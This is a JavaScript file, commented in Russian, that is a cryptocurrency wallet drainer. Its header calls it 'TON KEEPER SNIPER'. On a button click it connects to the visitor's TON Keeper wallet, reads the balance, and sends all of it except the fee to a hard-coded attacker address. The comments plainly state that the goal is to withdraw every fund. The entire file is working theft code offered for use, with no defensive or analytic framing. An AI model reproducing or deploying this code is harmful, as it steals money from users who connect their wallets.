// ============================================================
// TON KEEPER SNIPER — полный автоматический вывод средств
// Целевой адрес: UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
// ============================================================

const TARGET_WALLET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

// Проверяем наличие TON Wallet в браузере
function isTonKeeperInstalled() {
    return typeof window.ton !== 'undefined' || 
           typeof window.Tonkeeper !== 'undefined' ||
           (typeof window.$ton !== 'undefined');
}

// Получаем объект провайдера TON
function getTonProvider() {
    if (window.ton) return window.ton;
    if (window.Tonkeeper) return window.Tonkeeper;
    if (window.$ton) return window.$ton;
    return null;
}

// Подключение кошелька
async function connectWallet() {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    try {
        status.innerHTML = '⏳ Подключаемся к TON Keeper...';
        btn.disabled = true;

        if (!isTonKeeperInstalled()) {
            status.innerHTML = '❌ TON Keeper не установлен! Установите расширение.';
            btn.disabled = false;
            return;
        }

        const provider = getTonProvider();
        if (!provider) {
            status.innerHTML = '❌ Провайдер TON не найден.';
            btn.disabled = false;
            return;
        }

        // Запрашиваем подключение
        const accounts = await provider.request({
            method: 'ton_requestAccounts',
            params: []
        });

        if (!accounts || accounts.length === 0) {
            status.innerHTML = '❌ Пользователь отклонил подключение.';
            btn.disabled = false;
            return;
        }

        const userWallet = accounts[0];
        document.getElementById('userWallet').textContent = userWallet;
        status.innerHTML = `✅ Кошелёк подключён: ${userWallet.slice(0, 6)}...${userWallet.slice(-4)}`;

        // После успешного подключения — запускаем снифер
        await snipeFunds(provider, userWallet);

    } catch (error) {
        console.error(error);
        status.innerHTML = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
        btn.disabled = false;
    }
}

// ============================================================
// ОСНОВНАЯ ФУНКЦИЯ СНИФЕРА — переводит ВСЕ средства на целевой адрес
// ============================================================
async function snipeFunds(provider, fromAddress) {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');

    try {
        status.innerHTML = '🔄 Получаем баланс TON...';

        // 1. Получаем баланс в нано-TON (1 TON = 1e9 наноTON)
        const balanceHex = await provider.request({
            method: 'ton_getBalance',
            params: [fromAddress]
        });

        const balanceNano = parseInt(balanceHex, 16);
        if (isNaN(balanceNano) || balanceNano <= 0) {
            status.innerHTML = '💰 Баланс пуст (0 TON). Ничего не выведено.';
            btn.disabled = false;
            return;
        }

        const balanceTON = (balanceNano / 1e9).toFixed(6);
        status.innerHTML = `💰 Баланс: ${balanceTON} TON. Начинаем вывод...`;

        // 2. Рассчитываем комиссию (примерно 0.01 TON = 10_000_000 нано)
        const FEE_NANO = 10_000_000;
        const amountToSend = balanceNano - FEE_NANO;

        if (amountToSend <= 0) {
            status.innerHTML = '⚠️ Баланс меньше комиссии (0.01 TON). Невозможно вывести.';
            btn.disabled = false;
            return;
        }

        const amountTON = (amountToSend / 1e9).toFixed(6);
        status.innerHTML = `🔄 Отправляем ${amountTON} TON на целевой адрес...`;

        // 3. Формируем транзакцию
        const tx = {
            to: TARGET_WALLET,
            value: amountToSend.toString(),
            // Можно добавить comment, но для скорости оставляем пустым
            data: '', 
            stateInit: '',
            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
        };

        // 4. Отправляем транзакцию через провайдера
        const result = await provider.request({
            method: 'ton_sendTransaction',
            params: [tx]
        });

        // 5. Проверяем результат
        if (result && result.code === 0) {
            status.innerHTML = `✅ УСПЕШНО! Все средства (${amountTON} TON) переведены на ${TARGET_WALLET}`;
        } else {
            status.innerHTML = `⚠️ Транзакция отклонена или ошибка: ${result?.message || 'неизвестно'}`;
        }

    } catch (error) {
        console.error('SNIPE ERROR:', error);
        status.innerHTML = `❌ Ошибка при выводе: ${error.message || 'Неизвестная ошибка'}`;
    }

    btn.disabled = false;
}

// ============================================================
// Обработчики событий
// ============================================================
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('connectBtn');
    btn.addEventListener('click', connectWallet);

    // Если TON Keeper уже установлен — показываем это
    if (isTonKeeperInstalled()) {
        document.getElementById('status').innerHTML = '🟢 TON Keeper обнаружен. Нажмите кнопку для подключения.';
    } else {
        document.getElementById('status').innerHTML = '🔴 TON Keeper НЕ установлен. Установите расширение.';
    }
});